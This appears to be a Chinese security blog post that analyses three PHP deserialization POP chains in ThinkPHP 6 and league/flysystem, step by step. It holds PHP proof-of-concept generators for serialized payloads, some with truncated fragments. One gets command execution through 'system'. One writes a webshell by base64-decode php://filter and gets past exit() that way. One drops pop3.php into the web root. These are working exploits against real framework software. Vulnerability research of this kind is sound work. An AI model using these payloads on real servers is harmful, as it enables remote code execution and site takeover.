        private $withAttr = ["H3rmesk1t" => "system"];
    }
    namespace think\model;
    use think\Model;
    class Pivot extends Model{
        function __construct($obj = ''){
            parent::__construct($obj);
        }
    }
    echo base64_encode(serialize(new Pivot(new Pivot())));
    ?>
**POP链流程图**
###  POP链-2
**漏洞分析**
>   * 继续分析前面寻找的 `__destruct()` 方法，跟进 `vendor/league/flysystem-cached-> adapter/src/Storage/AbstractCache.php`
>
>   * 由于 `$this->autosave` 是可控的，可以触发到 `save()` 方法，由于 `AbstractCache`
> 是一个抽象类，在其本身的 `save()` 方法是不可利用的，故在其继承类中寻找可以利用的 `save()` 方法，跟进
> `src/think/filesystem/CacheStore.php` 中的 `save()` 方法
>
>   * 继续跟进其调用的 `getForStorage()` 方法，发现其进一步调用 `cleanContents()` 方法
>
>   * 跟进 `cleanContents()` 方法，其调用 `array_flip()` 方法对数组进行反转来交换数组中的键和值，然后经过
> `array_intersect_key()` 函数来使用键名比较计算数组的交集
>
> 然后函数会将 `$contents` 返回给 `getForStorage()` 中的 `$cleaned`，经过 `json_encode()`
> 方法后返回给前面的 `save()` 方法，`$contents` 变量接收函数返回值后进入后面的逻辑，此时 `$this->store`
> 是可控的，可以调用任意类的 `set()` 方法，如果这个指定的类不存在 `set()` 方法，就有可能触发 `__call()`，当然也有可能本身的
> `set()` 方法就可以利用
**exp-1**
> 直接寻找一个可以利用的 `set()` 方法
> 跟进 `src/think/cache/driver/File.php` 中的 `set()` 方法，发现有一个 `serialize()` 方法
> 继续跟进 `serialize()` 方法，发现 `$this->options` 参数是可控的，从而可以利用
> `$this->options['serialize'][0]` 来执行任意函数
> 接着看看需要的参数 `$data` 的来源，溯源发现先是来源于 `$value` 的传值，接着回到 `save()` 方法的 `$contents`
> 参数，由于 `$contents` 参数来源于 `getForStorage()` 方法，需要经过 `json_encode()` 方法，所以需要使
> `json_encode` 后的数据被当作代码执行  
>  由于 json_encode 的缘故，命令被方括号包裹导致无法正常执行，在 Linux 环境中可以使用 `command` 这样的形式使被包裹的
> command 优先执行
**POC**
    store = $store;
            }
        }
    }
    namespace think\cache {
        abstract class Driver {
            protected $options = ["serialize"=>["system"],"expire"=>1,"prefix"=>"1","hash_type"=>"sha256","cache_subdir"=>"1","path"=>"1"];
        }
    }
    namespace think\cache\driver {
        use think\cache\Driver;
        class File extends Driver{}
    }
    namespace {
        $file = new think\cache\driver\File();
        $cache = new think\filesystem\CacheStore($file);
        echo base64_encode(serialize($cache));
    }
    ?>
**POC链流程图**
**exp-2**
> 继续跟进 `src/think/cache/driver/File.php` 中的 `set()` 方法，在 `serialize()` 方法后还有一个
> `file_put_contents()` 方法
> 主要看看 `$filename` 和 `$data` 这两个参数是怎么赋值的，先跟进一下 `$filename` 参数，其值来源于
> `getCacheKey()` 方法，跟进该方法发现 `$filename` 参数是可控的：`$name`为文件名来源于
> `$this->key`，`$this->options['hash_type']` 也可控，最终文件名是经过 hash
> 后的，所以最终文件名可控，`$this->options['path']` 使用 `php filter` 构造
> `php://filter/write=convert.base64-decode/resource=think/public/`  
>  接着再来看看 `$data` 参数，前面分析已知来源于 `$this->serialize`，此处存在 exit()，正好结合上一步的文件名构造利用
> `php://filter` 来绕过死亡
> exit()，[参考文章](https://www.leavesongs.com/PENETRATION/php-filter-> magic.html)：假设传入的 `$expire=1`，那么写入的 webshell
> 前面部分在拼接之后能够被解码的有效字符为：`php//000000000001exit` 共有21个，要满足 base64 解码的 4 字符为 1
> 组的规则，在其前面补上 3 个字符用于逃逸之后的 base64 解码的影响
**POC**
    store = $store;
            }
        }
    }
    namespace think\cache {
        abstract class Driver {
            protected $options = ["serialize"=>["trim"],"expire"=>1,"prefix"=>false,"hash_type"=>"md5","cache_subdir"=>false,"path"=>"php://filter/write=convert.base64-decode/resource=C:/Tools/phpstudy_pro/WWW/html/ThinkPHP6/public/","data_compress"=>0];
        }
    }
    namespace think\cache\driver {
        use think\cache\Driver;
        class File extends Driver{}
    }
    namespace {
        $file = new think\cache\driver\File();
        $cache = new think\filesystem\CacheStore($file);
        echo base64_encode(serialize($cache));
    }
    ?>
**POC链流程图**
###  POP链-3
**漏洞分析**
> 起始的触发链和上一条 POP 链一样，用 `src/Storage/AbstractCache.php` 的 `__destruct()` 方法中的
> `save()` 方法作为起始点，寻找一个继承类的 `save()` 方法来作为触发点，这里跟进 `src/Storage/Adapter.php`
> 中的 `save()` 方法，其 `$contents` 的值来自于 `getForStorage()` 方法，这里进过的处理和上一条 POP
> 链分析的时候一样，主要来看看后面的 if…else 操作
> 由于需要通过 `write()` 方法来写入文件，所以需要先使得经过 `has()` 方法后的返回值为 false，这里先寻找一个同时有 `has()`
> 和 `write()` 方法的类
> 查看源码后发现 `src/Adapter/Local.php` 中的 `Local` 类符合要求，先跟进一下 `has()` 方法
> 跟进 `applyPathPrefix()` 方法，其先调用了前面的 `getPathPrefix()` 方法，其中 `$pathPrefix`
> 是可控的，`ltrim()` 方法删除字符串开头的 `/` 和 `\`，因此可以直接传入一个文件名，然后控制 pathPrefix 为路径部分，再回到
> `has()` 方法执行 `file_exists()` 方法，只需要保证传入的文件名不存在即可返回 false
> 再来看看 `write()` 方法，`$location` 的值来源于 `$this->file` 传入 `applyPathPrefix`
> 处理后的文件名，`$contents` 的值是经过 `json_encode` 处理后带有文件内容的 json 数据
**exp**
     ""];
        }
    }
    namespace League\Flysystem\Cached\Storage {
        use League\Flysystem\Cached\Storage\AbstractCache;
        class Adapter extends AbstractCache {
            protected $file;
            protected $adapter;
            public function __construct($adapter = "") {
                $this->file = "C:/Tools/phpstudy_pro/WWW/html/ThinkPHP6/public/pop3.php";
                $this->adapter = $adapter;
            }
        }
    }
    namespace League\Flysystem\Adapter {
        class Local {
            protected $writeFlags = 0;
        }
    }
    namespace {
        $local = new League\Flysystem\Adapter\Local();
        $cache = new League\Flysystem\Cached\Storage\Adapter($local);
        echo base64_encode(serialize($cache));
    }
    ?>
**POP链流程图**